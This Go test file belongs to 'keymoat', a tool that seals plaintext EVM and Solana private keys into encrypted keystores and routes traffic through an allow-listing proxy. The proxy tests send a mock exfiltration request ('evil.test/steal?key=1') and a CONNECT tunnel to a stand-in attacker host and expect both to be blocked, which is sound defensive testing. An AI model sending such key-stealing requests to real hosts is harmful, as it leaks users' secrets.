package main

import (
	"bytes"
	"crypto/ed25519"
	"crypto/rand"
	"encoding/hex"
	"fmt"
	"io"
	"net"
	"net/http"
	"net/http/httptest"
	"net/url"
	"os"
	"os/exec"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"
)

func TestEVMKeystoreRoundTrip(t *testing.T) {
	key, err := parseEVMKey(fakeKey)
	if err != nil {
		t.Fatal(err)
	}
	sealed, err := encryptEVMKey(key, "correct horse")
	if err != nil {
		t.Fatal(err)
	}
	if bytes.Contains(sealed, []byte(fakeKey[2:])) {
		t.Fatal("the key is in the keystore in plain text")
	}
	back, err := decryptEVMKey(sealed, "correct horse")
	if err != nil || !bytes.Equal(back, key) {
		t.Fatalf("did not open: %v", err)
	}
	if _, err := decryptEVMKey(sealed, "wrong"); err != errWrongPassword {
		t.Errorf("wrong password: %v", err)
	}
	for _, bad := range []string{"", "0x12", "zz" + fakeKey[4:], "0x" + strings.Repeat("0", 64)} {
		if _, err := parseEVMKey(bad); err == nil {
			t.Errorf("parseEVMKey(%q) should fail", bad)
		}
	}
}

// Foundry itself must be able to open what keymoat writes: that is the point of using its format.
func TestFoundryOpensTheKeystore(t *testing.T) {
	cast, err := exec.LookPath("cast")
	if err != nil {
		t.Skip("cast is not installed")
	}
	// The local node's first account: a key everyone knows, with a known address.
	key, _ := hex.DecodeString("ac0974bec39a17e36ba4a6b4d238ff944bacb478cbed5efcae784d7bf4f2ff80")
	sealed, err := encryptEVMKey(key, "pass-word-1")
	if err != nil {
		t.Fatal(err)
	}
	file := filepath.Join(t.TempDir(), "acct")
	write(t, file, string(sealed))
	out, err := exec.Command(cast, "wallet", "address", "--keystore", file, "--password", "pass-word-1").CombinedOutput()
	if err != nil || !strings.Contains(strings.ToLower(string(out)), "0xf39fd6e51aad88f6f4ce6ab8827279cfffb92266") {
		t.Fatalf("cast did not open it: %v %s", err, out)
	}
}

func TestSolanaVaultRoundTrip(t *testing.T) {
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	file := solanaKeypairJSON(key)
	parsed, err := parseSolanaKeypair(file)
	if err != nil || !parsed.Equal(key) {
		t.Fatalf("parse: %v", err)
	}
	sealed, err := encryptSolanaKeypair(key, "a password")
	if err != nil {
		t.Fatal(err)
	}
	back, err := decryptSolanaKeypair(sealed, "a password")
	if err != nil || !back.Equal(key) {
		t.Fatalf("did not open: %v", err)
	}
	if _, err := decryptSolanaKeypair(sealed, "other"); err != errWrongPassword {
		t.Errorf("wrong password: %v", err)
	}
	// An entry whose readable address was changed must not open.
	tampered := bytes.Replace(sealed, []byte(solanaAddress(key)), []byte("11111111111111111111111111111111"), 1)
	if _, err := decryptSolanaKeypair(tampered, "a password"); err == nil {
		t.Errorf("a tampered entry opened")
	}
	broken := append(ed25519.PrivateKey{}, key...)
	broken[63] ^= 1
	if _, err := parseSolanaKeypair(solanaKeypairJSON(broken)); err == nil {
		t.Errorf("a keypair whose halves do not match was accepted")
	}
}

func TestBase58(t *testing.T) {
	if got := base58(make([]byte, 32)); got != "11111111111111111111111111111111" {
		t.Errorf("the system program's address: %s", got)
	}
	if got := base58([]byte("Hello World!")); got != "2NEpo7TZRRrLZSi2U" {
		t.Errorf("got %s", got)
	}
}

func answers(t *testing.T, lines []string, passwords []string) {
	t.Helper()
	oldLine, oldSecret := readLine, readSecret
	t.Cleanup(func() { readLine, readSecret = oldLine, oldSecret })
	readLine = func(string) (string, error) {
		if len(lines) == 0 {
			return "", io.EOF
		}
		l := lines[0]
		lines = lines[1:]
		return l, nil
	}
	readSecret = func(string) (string, error) {
		if len(passwords) == 0 {
			return "", io.EOF
		}
		p := passwords[0]
		passwords = passwords[1:]
		return p, nil
	}
}

func TestMoveEnvKey(t *testing.T) {
	c := testContext(t)
	env := filepath.Join(c.Root, ".env")
	write(t, env, "# settings\nRPC=https://x.example.org\nDEPLOYER_PRIVATE_KEY="+fakeKey+"\nA=1\n")
	answers(t, []string{""}, []string{"short", "long-enough-pw", "mismatch", "long-enough-pw", "long-enough-pw"})
	if err := moveEnvKeys(env); err != nil {
		t.Fatal(err)
	}
	after, _ := os.ReadFile(env)
	if strings.Contains(string(after), fakeKey[2:]) || !strings.Contains(string(after), "RPC=https://x.example.org\n") || !strings.Contains(string(after), "A=1\n") || !strings.Contains(string(after), "--account deployer") {
		t.Fatalf("env file after the move:\n%s", after)
	}
	sealed, err := os.ReadFile(filepath.Join(c.Home, ".foundry", "keystores", "deployer"))
	if err != nil {
		t.Fatal(err)
	}
	if info, _ := os.Stat(filepath.Join(c.Home, ".foundry", "keystores", "deployer")); info.Mode().Perm() != 0o600 {
		t.Errorf("keystore mode %v", info.Mode().Perm())
	}
	key, err := decryptEVMKey(sealed, "long-enough-pw")
	if err != nil || "0x"+hex.EncodeToString(key) != fakeKey {
		t.Fatalf("the keystore does not hold the key: %v", err)
	}
}

func TestMoveSolanaKeypairAndUseIt(t *testing.T) {
	c := testContext(t)
	_, key, _ := ed25519.GenerateKey(rand.Reader)
	path := filepath.Join(c.Home, ".config", "solana", "id.json")
	write(t, path, string(solanaKeypairJSON(key)))
	answers(t, []string{"main"}, []string{"vault-password", "vault-password", "bad-password", "vault-password"})
	if err := moveSolanaKeypair(path); err != nil {
		t.Fatal(err)
	}
	if _, err := os.Stat(path); !os.IsNotExist(err) {
		t.Fatalf("the plain file is still there")
	}
	// The old path now stands for the vault entry, and so does keymoat:NAME.
	vaultIndex = nil
	for _, p := range []string{path, "keymoat:main"} {
		if ref, ok := parseVaultRef(p); !ok || ref.name != "main" {
			t.Errorf("parseVaultRef(%s) = %+v %v", p, ref, ok)
		}
	}
	if _, ok := parseVaultRef(filepath.Join(c.Home, "other.json")); ok {
		t.Errorf("an unrelated path is not a vault entry")
	}
	// One wrong password, then the right one.
	file, cleanup, err := materialize("main")
	if err != nil {
		t.Fatal(err)
	}
	data, _ := os.ReadFile(file)
	if got, err := parseSolanaKeypair(data); err != nil || !got.Equal(key) {
		t.Fatalf("the temporary file is not the key: %v", err)
	}
	if info, _ := os.Stat(file); info.Mode().Perm() != 0o600 {
		t.Errorf("temporary key mode %v", info.Mode().Perm())
	}
	cleanup()
	if _, err := os.Stat(file); !os.IsNotExist(err) {
		t.Errorf("the temporary key was left behind")
	}
}

func TestDevWalletIsStable(t *testing.T) {
	testContext(t)
	a, err := devWallet()
	if err != nil {
		t.Fatal(err)
	}
	b, _ := devWallet()
	if a == "" || a != b {
		t.Errorf("%q then %q", a, b)
	}
}

func TestProxy(t *testing.T) {
	upstream := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "hello from "+r.Host) }))
	defer upstream.Close()
	secure := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { io.WriteString(w, "secure hello") }))
	defer secure.Close()

	allowed := map[string]bool{"good.test": true}
	p := newProxy(func(h string) bool { return allowed[h] })
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	p.start(ln)
	defer p.stop()
	proxyURL, _ := url.Parse("http://" + ln.Addr().String())

	// Plain HTTP to a host that is not allowed.
	client := &http.Client{Transport: &http.Transport{Proxy: http.ProxyURL(proxyURL)}}
	resp, err := client.Get("http://evil.test/steal?key=1")
	if err != nil {
		t.Fatal(err)
	}
	resp.Body.Close()
	if resp.StatusCode != http.StatusForbidden {
		t.Errorf("a host that is not allowed got %d", resp.StatusCode)
	}
	// Plain HTTP and a TLS tunnel to local servers pass (local is always allowed).
	resp, err = client.Get(upstream.URL)
	if err != nil {
		t.Fatal(err)
	}
	body, _ := io.ReadAll(resp.Body)
	resp.Body.Close()
	if !strings.HasPrefix(string(body), "hello from") {
		t.Errorf("plain: %q", body)
	}
	tlsClient := secure.Client()
	tlsClient.Transport.(*http.Transport).Proxy = http.ProxyURL(proxyURL)
	resp, err = tlsClient.Get(secure.URL)
	if err != nil {
		t.Fatal(err)
	}
	body, _ = io.ReadAll(resp.Body)
	resp.Body.Close()
	if string(body) != "secure hello" {
		t.Errorf("tunnel: %q", body)
	}
	// A tunnel to a host that is not allowed is refused, and remembered.
	conn, err := net.Dial("tcp", ln.Addr().String())
	if err != nil {
		t.Fatal(err)
	}
	defer conn.Close()
	io.WriteString(conn, "CONNECT evil.test:443 HTTP/1.1\r\nHost: evil.test:443\r\n\r\n")
	buf := make([]byte, 64)
	n, _ := conn.Read(buf)
	if !strings.Contains(string(buf[:n]), "403") {
		t.Errorf("tunnel to a blocked host: %q", buf[:n])
	}
	if got := p.blockedHosts(); len(got) != 1 || got[0] != "evil.test" {
		t.Errorf("blocked = %v", got)
	}
}

// Many connections at once, large bodies, and clients that give up half-way: everything allowed arrives whole,
// and nothing is left running afterwards.
func TestProxyUnderLoad(t *testing.T) {
	body := bytes.Repeat([]byte("keymoat "), 128*1024) // 1 MB
	secure := httptest.NewTLSServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) { w.Write(body) }))
	defer secure.Close()
	p := newProxy(func(string) bool { return false })
	ln, err := net.Listen("tcp", "127.0.0.1:0")
	if err != nil {
		t.Fatal(err)
	}
	p.start(ln)
	proxyURL, _ := url.Parse("http://" + ln.Addr().String())
	before := runtime.NumGoroutine()

	client := secure.Client()
	tr := client.Transport.(*http.Transport)
	tr.Proxy = http.ProxyURL(proxyURL)
	tr.MaxConnsPerHost = 0
	var wg sync.WaitGroup
	errs := make(chan error, 200)
	for i := 0; i < 120; i++ {
		wg.Add(1)
		go func(i int) {
			defer wg.Done()
			resp, err := client.Get(secure.URL)
			if err != nil {
				errs <- err
				return
			}
			defer resp.Body.Close()
			if i%4 == 0 {
				// Give up after the first bytes.
				io.CopyN(io.Discard, resp.Body, 1000)
				return
			}
			got, err := io.ReadAll(resp.Body)
			if err != nil || !bytes.Equal(got, body) {
				errs <- fmt.Errorf("body arrived damaged: %d bytes, %v", len(got), err)
			}
		}(i)
	}
	// Raw clients that open a tunnel and vanish, and ones that send rubbish.
	for i := 0; i < 40; i++ {
		c, err := net.Dial("tcp", ln.Addr().String())
		if err != nil {
			t.Fatal(err)
		}
		if i%2 == 0 {
			io.WriteString(c, "CONNECT "+strings.TrimPrefix(secure.URL, "https://")+" HTTP/1.1\r\n\r\n")
		} else {
			io.WriteString(c, "\x00\x01garbage\r\n\r\n")
		}
		c.Close()
	}
	wg.Wait()
	close(errs)
	for err := range errs {
		t.Error(err)
	}
	tr.CloseIdleConnections()
	p.stop()
	secure.Close()
	deadline := time.Now().Add(5 * time.Second)
	for runtime.NumGoroutine() > before+5 && time.Now().Before(deadline) {
		time.Sleep(50 * time.Millisecond)
	}
	if n := runtime.NumGoroutine(); n > before+5 {
		t.Errorf("%d goroutines still running after the proxy stopped (%d before)", n, before)
	}
}
